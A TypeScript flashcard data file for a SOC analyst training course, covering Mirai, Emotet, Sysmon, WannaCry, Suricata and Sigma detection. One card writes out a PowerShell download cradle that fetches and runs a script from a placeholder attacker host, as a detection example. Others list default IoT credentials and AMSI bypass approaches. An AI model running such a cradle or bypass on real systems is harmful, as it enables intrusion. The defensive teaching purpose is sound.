import type { LinuxDomain } from "./linux-study-data";

/**
 * 30-Day SOC Analyst flashcards.
 *
 * Source: /Users/mdtowhidulahmed/Github-repo/30-days-soc/tutor/day-XX.md
 *
 * Each topic = one day. To add cards, edit the relevant day's `flashcards`
 * array below and rebuild (`npm run build`). Days with empty arrays are
 * stubs to be filled in as you progress through the 35-day program.
 */

export const SOC_FLASHCARD_DOMAINS: LinuxDomain[] = [
  {
    key: "week-1",
    name: "Week 1 — First Contact",
    level: "beginner",
    topics: [
      {
        slug: "day-01",
        title: "Day 1 — The Mirai Mystery",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "What is a botnet, and what does C2 stand for?",
            back: "A botnet is a group of compromised devices controlled by an attacker through a C2 (Command and Control) channel — used to send orders (e.g. 'attack target') and receive heartbeats.",
          },
          {
            front: "What ports did the Mirai botnet use, and what are they for?",
            back: "Port 23/TCP (Telnet) — initial access via default-credential brute force. Port 48101/TCP — bots reporting in to C2 (heartbeat / status).",
          },
          {
            front: "Why are IoT devices a common botnet target?",
            back: "(1) Shipped with hardcoded default credentials (admin:admin, root:xc3511, etc.). (2) Rarely updated by users. (3) Always-on, always-connected. (4) Limited or no logging visibility from the user's side.",
          },
          {
            front: "Name the 3 categories of DDoS attacks with one example each.",
            back: "(1) Volumetric — saturate bandwidth (UDP flood, DNS amplification). (2) Protocol — exhaust connection state (SYN flood, Ping of Death). (3) Application-layer — exhaust app resources (HTTP GET flood, Slowloris).",
          },
          {
            front: "What was the Dyn DDoS attack of October 21, 2016, and why was it significant?",
            back: "Mirai botnet hit Dyn DNS infrastructure with a 1.2 Tbps attack, taking down Twitter, Netflix, GitHub, Reddit, Spotify across the US East Coast. First IoT-driven DDoS at terabit scale; proved consumer cameras/DVRs could weaponize against critical internet infrastructure.",
          },
          {
            front: "Why is Telnet (port 23) a security disaster, and what should replace it?",
            back: "Telnet sends ALL traffic — including credentials — in cleartext. No encryption, no server identity authentication. Replace with SSH (22/TCP): encrypted, key-based auth, integrity-protected. Telnet should be disabled on every modern device.",
          },
          {
            front: "What are the high-level steps in any SOC incident investigation?",
            back: "(1) Triage — confirm not a false positive. (2) Scope — what hosts/users/data are affected. (3) Identify TTPs — how did the attacker get in / what did they do. (4) Contain — stop the bleeding. (5) Eradicate + recover. (6) Lessons learned — write detection / harden.",
          },
          {
            front: "Name 3 containment actions for a Mirai-style IoT botnet on your network.",
            back: "(1) Block outbound 23/TCP and 48101/TCP at the firewall. (2) Segment IoT devices into a separate VLAN with no path to corporate LAN. (3) Force credential rotation + disable Telnet on every IoT device.",
          },
          {
            front: "What is an IOC, and give 4 categories with examples.",
            back: "IOC = Indicator of Compromise. Forensic evidence a system has been compromised. Categories: (1) Hash — file SHA-256. (2) IP — C2 server. (3) Domain — malicious resolver. (4) Network artifact — User-Agent, port pattern. (5) Host artifact — registry key, mutex name.",
          },
          {
            front: "What does 'dwell time' mean in incident response, and why is short dwell time good?",
            back: "Dwell time = time between attacker initial access and detection. Industry median ~16 days (Mandiant 2023). Short dwell time = attacker had less time to escalate, move laterally, or exfiltrate. Reducing dwell time is a primary SOC KPI.",
          },
          {
            front: "Why does the Pyramid of Pain say 'TTPs' are more painful for attackers than 'hashes'?",
            back: "A hash changes every recompile (trivial). An IP changes by renting new infrastructure (cheap). But a TTP — the actual technique like 'Telnet brute-force on default creds' — requires inventing a NEW way of working. That's expensive. Detect on TTPs for durability.",
          },
        ],
      },
      {
        slug: "day-02",
        title: "Day 2 — Networking Fundamentals",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "Name the 6 TCP flags and what each signals.",
            back: "SYN (synchronize, open connection), ACK (acknowledge), FIN (finish, close gracefully), RST (reset, abort), PSH (push data to app), URG (urgent, prioritize).",
          },
          {
            front: "Walk through the TCP three-way handshake.",
            back: "(1) Client → Server: SYN (seq=X). (2) Server → Client: SYN-ACK (seq=Y, ack=X+1). (3) Client → Server: ACK (ack=Y+1). Connection now ESTABLISHED. Both sides have agreed initial sequence numbers and the connection is bidirectional-ready.",
          },
          {
            front: "TCP vs UDP — name 3 key differences.",
            back: "(1) TCP is connection-oriented (handshake, state); UDP is fire-and-forget. (2) TCP guarantees order + delivery (retransmits); UDP doesn't. (3) TCP has flow + congestion control; UDP doesn't. Use TCP for HTTP/SSH/email; UDP for DNS/VoIP/games.",
          },
          {
            front: "In TLS 1.3, what is the SNI and why does it matter for SOC visibility?",
            back: "SNI = Server Name Indication. It's a field in the cleartext ClientHello that tells the server which hostname the client wants. SOC analysts use SNI to identify destination websites even though all subsequent payload is encrypted (no DPI possible).",
          },
          {
            front: "What's the high-level TLS 1.3 handshake flow?",
            back: "(1) ClientHello — supported ciphers + SNI + key share. (2) ServerHello — selected cipher + cert + key share. (3) Both sides derive shared session key. (4) Encrypted application data flows. TLS 1.3 collapsed TLS 1.2's multi-roundtrip into one. 0-RTT early data optional.",
          },
          {
            front: "How does DNS amplification work?",
            back: "Attacker spoofs the source IP of a DNS query to the victim's IP, then queries an open DNS resolver for a large response (e.g. ANY record). The resolver sends the large response to the victim, multiplying the attack volume 50–100×.",
          },
          {
            front: "Name 5 common DNS record types and what each is for.",
            back: "A — IPv4 address. AAAA — IPv6 address. MX — mail server for domain. TXT — arbitrary text (used for SPF, DKIM, domain verification). CNAME — alias to another name. NS — authoritative name server. PTR — reverse lookup (IP → name).",
          },
          {
            front: "Why is DNS a top SOC monitoring target?",
            back: "Almost every malicious action touches DNS: malware C2 lookups, exfiltration via DNS tunneling, DGA-generated domains. DNS is largely cleartext (until DoH/DoT) and can be monitored cheaply. Suspicious DNS = early signal of compromise before any payload moves.",
          },
          {
            front: "Name 8 ports and protocols a SOC analyst must know cold.",
            back: "22/TCP SSH, 23/TCP Telnet (legacy), 25/TCP SMTP, 53/UDP DNS, 80/TCP HTTP, 443/TCP HTTPS, 445/TCP SMB, 3389/TCP RDP, 587/TCP SMTP-Submission, 993/TCP IMAPS.",
          },
          {
            front: "Give 5 essential Wireshark display filters and what each shows.",
            back: "`ip.addr == 1.2.3.4` — traffic to/from host. `tcp.port == 445` — SMB. `http.request.method == POST` — HTTP POSTs. `dns.qry.name contains \"badguy\"` — DNS lookups for that string. `tls.handshake.extensions_server_name` — SNI values. `tcp.flags.syn == 1 && tcp.flags.ack == 0` — SYN-only (port scans).",
          },
          {
            front: "What is ARP, and how does ARP poisoning work?",
            back: "ARP = Address Resolution Protocol. Maps IP addresses to MAC addresses on a local LAN. ARP poisoning = attacker sends gratuitous ARP replies claiming attacker's MAC owns the gateway IP, redirecting victim's outbound traffic through attacker → MITM. Detect with arpwatch or ARP-table anomalies.",
          },
          {
            front: "Define MITM and name 3 ways an attacker can establish one.",
            back: "MITM = Man-in-the-Middle. Attacker positions between two endpoints, can inspect/modify traffic. Methods: (1) ARP poisoning on LAN. (2) Rogue Wi-Fi access point. (3) DNS spoofing. (4) BGP hijacking (ISP-level). Mitigation: TLS with cert pinning, DNSSEC, 802.1X.",
          },
        ],
      },
      {
        slug: "day-03",
        title: "Day 3 — The Twitter Heist",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "What is vishing? Give one real-world example.",
            back: "Vishing = voice phishing. Attacker uses phone calls to manipulate targets into giving credentials or access. Real example: 2020 Twitter Hack — attackers vished Twitter employees with admin tool access, gained admin panel access, compromised 130 accounts including verified celebrities, stole ~$117k in Bitcoin.",
          },
          {
            front: "Define phishing, spear-phishing, whaling, smishing.",
            back: "Phishing — generic email lure to mass audience. Spear-phishing — tailored to specific person (uses public OSINT). Whaling — spear-phishing aimed at executives / high-value targets. Smishing — phishing via SMS. All are social engineering, just different delivery channels.",
          },
          {
            front: "What is MFA fatigue and how does an attacker exploit it?",
            back: "MFA fatigue = attacker triggers repeated MFA push notifications until the target gets annoyed and approves one to stop the spam. The attacker is now logged in. Examples: Uber 2022, Cisco 2022. Mitigation: number matching, push-to-confirm, hardware tokens.",
          },
          {
            front: "What are the 3 authentication factor types? Give an example of each.",
            back: "(1) Something you know — password, PIN. (2) Something you have — hardware token (YubiKey), TOTP app, SMS code. (3) Something you are — fingerprint, face, voice. True MFA = at least 2 different categories. Two passwords ≠ MFA.",
          },
          {
            front: "Rank these MFA methods strongest → weakest: SMS OTP, TOTP app, hardware token (FIDO2/WebAuthn), push notification.",
            back: "Strongest: hardware token (FIDO2/WebAuthn) — phishing-resistant, origin-bound. Then: TOTP app (Authy/Google Authenticator). Then: push with number-matching. Weakest: SMS OTP — vulnerable to SIM-swap, SS7 interception. NIST 800-63B deprecates SMS for high-assurance.",
          },
          {
            front: "What are the 3 insider threat archetypes?",
            back: "(1) Malicious — intentionally damages org (rare, high impact). (2) Negligent — clicks phishing, ignores policy (most common). (3) Compromised — credentials stolen by external attacker (e.g. Twitter Hack 2020).",
          },
          {
            front: "What is OAuth (high-level), and what is the typical SOC concern with it?",
            back: "OAuth 2.0 = delegated authorization framework. User grants a third-party app limited access to their account at another service (e.g. 'Sign in with Google'). SOC concern: malicious OAuth apps with consent-phishing attacks — user grants persistent token access to attacker app, which survives password change.",
          },
          {
            front: "What is an Identity Provider (IdP), and name 2 enterprise examples.",
            back: "IdP = service that authenticates users and issues identity assertions to other applications (relying parties). Examples: Okta, Microsoft Entra ID (Azure AD), Google Workspace, Ping Identity, Auth0. Centralizes auth, enables SSO + MFA enforcement.",
          },
          {
            front: "What does SSO stand for, and what's its biggest single risk?",
            back: "SSO = Single Sign-On. User authenticates once, gets access to many apps. Biggest risk: SSO compromise = total compromise (one credential unlocks everything). Mitigation: strong MFA on the IdP, conditional access, session length limits, anomaly detection on IdP logs.",
          },
          {
            front: "Walk through the 2020 Twitter Hack timeline at a SOC level.",
            back: "(1) Vishing of Twitter employees — attackers impersonated IT, walked targets through 'VPN issue'. (2) Captured employee creds + 2FA. (3) Pivoted to internal admin tool. (4) Compromised 130 accounts incl. Obama, Musk, Bezos. (5) Posted Bitcoin scam from verified accounts. (6) Stole ~$117k in <2 hours before takedown.",
          },
          {
            front: "Name 4 detection signals you'd write for OAuth / SSO compromise.",
            back: "(1) New OAuth app consent grant by privileged user. (2) Login from unusual geolocation/ASN for that user. (3) Impossible travel (login from 2 cities <1h apart). (4) New device + new location + new user-agent in same session. (5) Mass MFA prompts (fatigue indicator).",
          },
        ],
      },
      {
        slug: "day-04",
        title: "Day 4 — Emotet in the Inbox",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "Name the 3 email authentication mechanisms and what each verifies.",
            back: "(1) SPF — verifies sender IP is authorized for the domain (per DNS TXT). (2) DKIM — verifies digital signature using domain's published public key. (3) DMARC — policy on what to do if SPF or DKIM fail (none/quarantine/reject) + aggregate reporting.",
          },
          {
            front: "Why is DMARC `p=none` essentially useless for stopping spoofing?",
            back: "`p=none` tells receivers to take no action even if SPF/DKIM fail — emails are still delivered to inbox. It's only useful in monitor-mode (collect aggregate reports while you fix DKIM). Real protection requires `p=quarantine` or `p=reject` after baselining.",
          },
          {
            front: "What email headers do you check first when triaging a phishing report?",
            back: "(1) Received chain — full path from origin MTA to destination (look for unusual hops). (2) Return-Path — true bounce address (often differs from From: header). (3) Authentication-Results — SPF/DKIM/DMARC verdicts. (4) Message-ID — uniqueness, format. (5) X-Originating-IP if present.",
          },
          {
            front: "What is the canonical Emotet kill chain that ends in ransomware?",
            back: "Phish (macro doc) → user enables macro → PowerShell download cradle → Emotet loader → TrickBot (data theft + lateral movement) → Cobalt Strike (C2) → Ryuk ransomware (or Conti). Dwell time before ransomware: 30–90 days.",
          },
          {
            front: "What is an Initial Access Broker (IAB) in the cybercrime economy?",
            back: "An IAB compromises networks (phishing, exposed RDP, vuln exploit) then SELLS that access — typically as creds/web-shells — to ransomware operators on dark-web markets. Emotet famously evolved into an IAB platform. Average price per access: hundreds-to-thousands USD depending on org size and access level.",
          },
          {
            front: "Why is 'winword.exe spawning cmd.exe or powershell.exe' a critical detection signal?",
            back: "Microsoft Office almost never legitimately needs to spawn cmd/powershell as a child process. This parent-child anomaly is one of the highest-signal endpoint detections for macro-based malware. EDR + Sysmon EID 1 + parent-process correlation catches this.",
          },
          {
            front: "What is `olevba` and what does it tell you?",
            back: "olevba (part of oletools, Python) parses Microsoft Office documents and dumps embedded VBA macro source code, decoded strings, suspicious keywords (Shell/Run/Download/Open/AutoOpen). Used by SOC analysts and malware reversers to triage suspicious .doc/.xls without executing.",
          },
          {
            front: "What is a 'macro download cradle' in PowerShell?",
            back: "A short PowerShell one-liner that downloads + executes a payload from the internet. Canonical form: `powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')\"`. Common Emotet/Trickbot pattern. Detected via `IEX`, `DownloadString`, `-EncodedCommand`, `-w hidden` flags.",
          },
          {
            front: "Name 3 typical Office macro persistence mechanisms on Windows.",
            back: "(1) Registry Run keys (HKCU/HKLM\\...\\Run, T1547.001). (2) Scheduled Tasks (T1053.005). (3) WMI Event Subscription (T1546.003). Also seen: Startup folder LNK, services (T1543.003).",
          },
          {
            front: "What is `powershell.exe -EncodedCommand` and why is it a red flag?",
            back: "`-EncodedCommand` accepts a Base64-encoded PowerShell script. Attackers use it to obfuscate intent and bypass naive string-match detections. Legitimate admin scripts rarely need it. Detection: alert on any `powershell -enc` or `-encodedcommand` parent-process pair, decode the Base64 to inspect.",
          },
          {
            front: "Top containment actions for an Emotet-style phishing-delivered macro on a corporate endpoint.",
            back: "(1) Isolate host via EDR (network containment) before attacker pivots. (2) Reset user creds + revoke active sessions/tokens. (3) Block C2 IPs/domains at firewall + DNS sinkhole. (4) Email gateway: search for and remove all copies of the lure email org-wide. Forensics + reimage after containment.",
          },
          {
            front: "Name 4 SOC detection points for macro-based phishing.",
            back: "(1) Email gateway: SPF/DKIM/DMARC fails + macro-bearing attachment. (2) Endpoint: Sysmon EID 1 with WINWORD.EXE / EXCEL.EXE as parent of cmd/powershell/wscript. (3) Network: outbound HTTP from Office processes. (4) Persistence: registry Run-key creation by Office child processes.",
          },
        ],
      },
      {
        slug: "day-05",
        title: "Day 5 — Sysmon & Windows",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "Name the 4 most important Sysmon Event IDs and what each captures.",
            back: "EID 1 = Process Create (includes parent process + command line). EID 3 = Network Connection (outbound TCP/UDP). EID 11 = FileCreate (payload drop). EID 13 = RegistryEvent (persistence keys).",
          },
          {
            front: "Name 4 more useful Sysmon Event IDs beyond the headline 4 (1, 3, 11, 13).",
            back: "EID 7 = Image Loaded (DLL injection / unsigned DLLs). EID 8 = CreateRemoteThread (process injection). EID 10 = ProcessAccess (LSASS access for credential dumping). EID 22 = DNS query. EID 12 = RegistryEvent CreateDelete object.",
          },
          {
            front: "Sysmon EID 1 vs Windows Security EID 4688 — what's the difference?",
            back: "Both log process creation. EID 4688 is built-in Windows audit (no install needed) but lacks parent-process command line by default and has weaker filtering. Sysmon EID 1 includes parent ProcessGuid, full command line, hashes, image signatures, and config-driven filtering. SOCs run BOTH for redundancy.",
          },
          {
            front: "What does SwiftOnSecurity's sysmon-config do that out-of-box Sysmon doesn't?",
            back: "Filters noise from chatty Windows internal processes, logs the high-value events (process create with parent, network connections from non-system processes, registry persistence keys, DLL loads from suspicious paths). Community-tuned starting point; better than nothing, easier than writing your own.",
          },
          {
            front: "What does the Wazuh agent do, and where does it talk to?",
            back: "The Wazuh agent (lightweight daemon, runs on Linux/Windows/Mac) collects logs, file-integrity events, system inventory, and rootcheck results. It ships them encrypted (AES + UDP/TCP 1514) to the Wazuh manager, which decodes, applies rules, and stores indexed alerts in OpenSearch/Elasticsearch.",
          },
          {
            front: "On a Linux/Mac Wazuh agent, where do you find the agent's working directory and main log?",
            back: "Working dir: `/var/ossec/`. Main log: `/var/ossec/logs/ossec.log` (agent-side errors, connection state). Agent config: `/var/ossec/etc/ossec.conf`. Control: `/var/ossec/bin/wazuh-control start|stop|status`. To register the agent: `manage_agents` on manager → `agent-auth` on agent.",
          },
          {
            front: "What is Atomic Red Team and what's it used for?",
            back: "Atomic Red Team (by Red Canary) is a free library of small, atomic tests that simulate specific MITRE ATT&CK techniques. SOC analysts use it to: (1) verify detection rules fire on real technique execution; (2) practice writing detections; (3) measure coverage. Each 'atomic' maps to one ATT&CK technique ID.",
          },
          {
            front: "What is MITRE ATT&CK technique T1059.001? What atomic-tier indicators would you alert on?",
            back: "T1059.001 = Command and Scripting Interpreter: PowerShell (Execution tactic). Indicators: powershell.exe with `-EncodedCommand`, `-nop -w hidden`, `IEX`, `DownloadString`, `Invoke-Expression`, suspicious parent (Office, Outlook, browsers), execution from %TEMP% or %APPDATA%.",
          },
          {
            front: "What does the AMSI (Antimalware Scan Interface) do, and how do attackers bypass it?",
            back: "AMSI is a Windows API that lets AV/EDR scan in-memory script content (PowerShell, JScript, VBScript, .NET) BEFORE execution. Attackers bypass via: (1) AMSI session-key patching in memory. (2) Obfuscation (string concat, env-var injection). (3) Older PS versions (v2 lacks AMSI). Defenders: alert on AmsiScanBuffer-related load failures.",
          },
          {
            front: "Why is parent-process correlation (not just process name) the key Sysmon detection technique?",
            back: "powershell.exe alone is normal. powershell.exe spawned BY winword.exe is malicious. cmd.exe alone is normal. cmd.exe spawned by services.exe is suspicious. EID 1 includes ParentImage + ParentCommandLine, which lets you write rules expressing intent and behaviour, not just file names. Hashes + names are weak; relationships are durable.",
          },
          {
            front: "Name 3 high-value Sysmon-driven detections you'd implement on Day 1 of a new SOC.",
            back: "(1) Office (winword/excel/outlook) → cmd/powershell/wscript child. (2) PowerShell with `-EncodedCommand` or download cradle strings. (3) New service install (EID 6) outside business hours. (4) LSASS process access (EID 10) by anything except known system tools. (5) Registry Run-key creation by non-installer processes.",
          },
        ],
      },
      {
        slug: "day-06",
        title: "Day 6 — WannaCry + Suricata",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "What CVE / MS-bulletin is EternalBlue and what does it exploit?",
            back: "CVE-2017-0144 / MS17-010. A buffer overflow in Windows SMBv1 (srv.sys driver). Allows unauthenticated RCE as SYSTEM by sending a crafted SMB packet. Patched March 14, 2017. Used by WannaCry (May 2017) and NotPetya (June 2017).",
          },
          {
            front: "Where did EternalBlue come from?",
            back: "EternalBlue was an exploit developed by the NSA's TAO group, leaked publicly by the 'Shadow Brokers' threat group in April 2017. Microsoft had been informed and patched it (MS17-010) in March 2017. WannaCry exploited it just 2 months after the leak — and 2 months after the patch was available.",
          },
          {
            front: "What is the WannaCry kill switch and how was it discovered?",
            back: "WannaCry checks if 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com' resolves. If it does → assume sandbox → exit (no encryption). Marcus Hutchins (MalwareTech) found the domain in the malware strings, registered it for $10.69 to track infections, and accidentally globally killed the worm.",
          },
          {
            front: "What is SMB, what ports does it run on, and why is it a top SOC monitoring target?",
            back: "SMB = Server Message Block, file/print sharing protocol. Ports: 445/TCP (modern, direct-over-TCP) and 139/TCP (legacy NetBIOS). Critical to monitor because: lateral movement uses SMB (PsExec, WMI), ransomware spreads via SMB (WannaCry, NotPetya), and most internal Windows networks have it open everywhere.",
          },
          {
            front: "Distinguish a worm from ransomware — give an example that's both.",
            back: "Worm = self-propagating malware (no user click required). Ransomware = encrypts files, demands payment. WannaCry is both: a ransomware payload PLUS a worm propagation engine (EternalBlue + SMB scanning). NotPetya was a worm + wiper masquerading as ransomware.",
          },
          {
            front: "What was the global impact of WannaCry in May 2017?",
            back: "200,000+ machines across 150 countries. Notable victims: UK NHS (operations cancelled, A&E shut), Telefonica, FedEx, Renault, Russian Interior Ministry. Attributed to North Korea's Lazarus Group. Estimated damages: $4 billion+. Stopped within ~2 days by Marcus Hutchins's kill-switch registration.",
          },
          {
            front: "What does Suricata's 'eve.json' contain, and how do you read it efficiently?",
            back: "eve.json is Suricata's structured-JSON event log. One JSON object per line. Event types: alert, dns, http, tls, flow, fileinfo. Read efficiently with jq, e.g.: jq 'select(.event_type==\"alert\") | {time:.timestamp, sig:.alert.signature, src:.src_ip, dst:.dest_ip}'",
          },
          {
            front: "Anatomy of a Suricata rule — explain each part of: `alert tcp $HOME_NET any -> $EXTERNAL_NET 445 (msg:\"SMB outbound\"; sid:1000001; rev:1;)`",
            back: "`alert` — action (alert/drop/pass/reject). `tcp` — protocol. `$HOME_NET any` — source IP variable + any port. `->` — direction (use `<>` for bidirectional). `$EXTERNAL_NET 445` — dest IP variable + dest port. `msg:` — analyst-facing description. `sid:` — unique signature ID (≥1000000 for custom). `rev:` — revision counter.",
          },
          {
            front: "What is Emerging Threats (ET Open) and why use it?",
            back: "ET Open is a free, community-maintained Suricata/Snort ruleset with thousands of detections for malware C2, exploits, scanning, exfiltration patterns. Updated daily. Run `suricata-update` to fetch. SOCs use it as their detection baseline before writing custom rules.",
          },
          {
            front: "IDS vs IPS vs IDPS — what's the practical difference?",
            back: "IDS (Intrusion DETECTION System) — passively logs/alerts, doesn't block. Sits out-of-band on a span/tap port. IPS (Intrusion PREVENTION System) — inline, can drop/reject malicious traffic. IDPS = combined system. Suricata can run as either. Tradeoff: IPS can break legitimate traffic on FPs; IDS can't.",
          },
          {
            front: "Suricata vs Snort — same idea, what's the meaningful difference today?",
            back: "Both write rules in nearly the same syntax. Suricata is multi-threaded (better on modern multi-core hardware), produces structured JSON output (eve.json) by default, has built-in TLS/SSH/SMB protocol parsers, and is the open-source SOC favourite. Snort is the older parent — Cisco-maintained Snort 3 is competitive, but Suricata leads in OSS deployments.",
          },
          {
            front: "What's the top-priority containment action for ransomware spreading via SMB, BEFORE any forensics?",
            back: "Network segmentation: block 445/TCP at the core switch between VLANs. Stops the spread immediately. Forensics + EDR isolation come second. For WannaCry specifically, an emergency internal DNS sinkhole of the kill-switch domain neutralizes the worm without touching endpoints.",
          },
        ],
      },
      {
        slug: "day-07",
        title: "Day 7 — Detection 101",
        content: "",
        commands: [],
        tips: [],
        flashcards: [
          {
            front: "What are the 6 levels of the Pyramid of Pain, bottom to top?",
            back: "(1) Hash values, (2) IP addresses, (3) Domain names, (4) Network/host artifacts, (5) Tools, (6) TTPs (Tactics, Techniques, Procedures). Higher = more painful for attacker to change. Write detections as high up as possible for durability.",
          },
          {
            front: "What's the difference between an ATT&CK tactic, technique, and sub-technique? Give example IDs.",
            back: "Tactic = the WHY (e.g. Execution = TA0002). Technique = the HOW (e.g. T1059 Command and Scripting Interpreter). Sub-technique = specific variant (e.g. T1059.001 = PowerShell). Procedures = real adversary implementations seen in the wild.",
          },
          {
            front: "Name 6 of the 14 MITRE ATT&CK Enterprise tactics, in attack order.",
            back: "Initial Access (TA0001) → Execution (TA0002) → Persistence (TA0003) → Privilege Escalation (TA0004) → Defense Evasion (TA0005) → Credential Access (TA0006) → Discovery (TA0007) → Lateral Movement (TA0008) → Collection (TA0009) → Command and Control (TA0011) → Exfiltration (TA0010) → Impact (TA0040). (Plus Reconnaissance and Resource Development pre-attack.)",
          },
          {
            front: "What is the ATT&CK Navigator and what do SOC teams use it for?",
            back: "ATT&CK Navigator = free web tool for visualizing the ATT&CK matrix as a heatmap. SOC uses: (1) Coverage mapping — colour techniques you have detections for. (2) Threat-actor overlay — see which TTPs APT-X uses. (3) Gap analysis — diff your coverage against an adversary profile to prioritize new detections.",
          },
          {
            front: "What's the difference between true-positive, false-positive, and false-negative? Which is the most dangerous?",
            back: "TP = real attack, alerted correctly. FP = no attack, alerted (noise — wastes analyst time). FN = real attack, NOT alerted (the dangerous one — attacker gets in undetected). FPs cause alert fatigue → analysts ignore real alerts. Tune detections to minimize FN first, FP second.",
          },
          {
            front: "Define 'detection-as-code'. What concrete practices does it imply?",
            back: "Treating detection rules like software: version-controlled in Git, peer-reviewed via PRs, unit-tested (Sigma → sigma test), CI-validated, deployed via pipelines, mapped to ATT&CK + threat models. Replaces ad-hoc 'edit-in-the-SIEM-UI'. Enables coverage metrics + safe rollback.",
          },
          {
            front: "What is Sigma, and what makes it powerful for multi-SIEM detection engineering?",
            back: "Sigma = generic, vendor-neutral YAML format for log-based detection rules. Write the rule once, convert to Splunk SPL, Elastic ES|QL, Wazuh, Sentinel KQL, ChronicleSecOps, etc. via `sigma convert`. Lets a SOC own its detection IP independent of any one SIEM vendor.",
          },
          {
            front: "Anatomy of a Sigma rule — name 5 required/important top-level keys.",
            back: "`title` — human-readable name. `id` — UUID. `status` — stable/test/experimental. `logsource` — product/category/service (selects parser). `detection` — selection blocks + condition expression. `level` — informational/low/medium/high/critical. `tags` — ATT&CK technique IDs (`attack.t1059.001`).",
          },
          {
            front: "What are LOLBins (LOLBAS), and why are they detection challenges?",
            back: "LOLBins / LOLBAS = Living-Off-the-Land Binaries / Scripts. Legitimate Windows-signed binaries (certutil, mshta, regsvr32, rundll32, bitsadmin, wmic) abused for malicious purposes. Hard to block (system-critical), so detection focuses on UNUSUAL command-line patterns + parent processes, not the binary itself. See lolbas-project.github.io.",
          },
          {
            front: "What is 'frequency analysis' or 'stack counting' in threat hunting?",
            back: "Aggregate normal-looking events across the org (e.g. `parent_image, child_image` for all process-creation events), sort by count, look at the LONG TAIL — rare combinations are the interesting ones. Catches anomalies without needing prior IOC knowledge. Splunk: `stats count by ...`. KQL: `summarize count() by ...`.",
          },
          {
            front: "In a Wazuh custom rule, what does <if_sid> do, and why use it?",
            back: "<if_sid> chains the custom rule from a parent (built-in) rule. The custom rule is only evaluated if the parent matched. This makes detection efficient (no full-event re-decoding) and lets you build on Wazuh's well-tuned parent decoders.",
          },
        ],
      },
    ],
  },
  {
    key: "week-2",
    name: "Week 2 — Tooling Up",
    level: "intermediate",
    topics: [
      { slug: "day-08", title: "Day 8 — Consolidation 1", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-09", title: "Day 9 — Splunk + SPL", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-10", title: "Day 10 — Colonial Pipeline (INC-005)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-11", title: "Day 11 — Log4Shell (INC-002)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-12", title: "Day 12 — Sentinel + KQL", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-13", title: "Day 13 — Sigma Authoring", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-14", title: "Day 14 — Cross-SIEM Day", content: "", commands: [], tips: [], flashcards: [] },
    ],
  },
  {
    key: "week-3",
    name: "Week 3 — The Big Leagues",
    level: "intermediate",
    topics: [
      { slug: "day-15", title: "Day 15 — Kaseya VSA (INC-006)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-16", title: "Day 16 — Consolidation 2", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-17", title: "Day 17 — Velociraptor + DFIR", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-18", title: "Day 18 — MOVEit / CL0P (INC-009)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-19", title: "Day 19 — SolarWinds (INC-001)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-20", title: "Day 20 — Cloud Threats (M365 / AWS)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-21", title: "Day 21 — IR Lifecycle + NIST 800-61", content: "", commands: [], tips: [], flashcards: [] },
    ],
  },
  {
    key: "week-4",
    name: "Week 4 — Hunt & Harden",
    level: "advanced",
    topics: [
      { slug: "day-22", title: "Day 22 — Threat Hunting", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-23", title: "Day 23 — Sigma at Scale", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-24", title: "Day 24 — YARA + Malware Triage", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-25", title: "Day 25 — Consolidation 3", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-26", title: "Day 26 — NotPetya Capstone (INC-010)", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-27", title: "Day 27 — Gap Analysis", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-28", title: "Day 28 — Detection-as-Code CI", content: "", commands: [], tips: [], flashcards: [] },
    ],
  },
  {
    key: "week-5",
    name: "Week 5 — Job Ready",
    level: "advanced",
    topics: [
      { slug: "day-29", title: "Day 29 — Resume + LinkedIn", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-30", title: "Day 30 — Mock Interviews", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-31", title: "Day 31 — Portfolio Polish", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-32", title: "Day 32 — TryHackMe SOC Sim", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-33", title: "Day 33 — Apply + Network", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-34", title: "Day 34 — Consolidation 4", content: "", commands: [], tips: [], flashcards: [] },
      { slug: "day-35", title: "Day 35 — Graduation", content: "", commands: [], tips: [], flashcards: [] },
    ],
  },
];

export const SOC_TOTAL_FLASHCARDS = SOC_FLASHCARD_DOMAINS.reduce(
  (sum, d) => sum + d.topics.reduce((s, t) => s + t.flashcards.length, 0),
  0
);

export const SOC_TOTAL_TOPICS = SOC_FLASHCARD_DOMAINS.reduce(
  (sum, d) => sum + d.topics.length,
  0
);
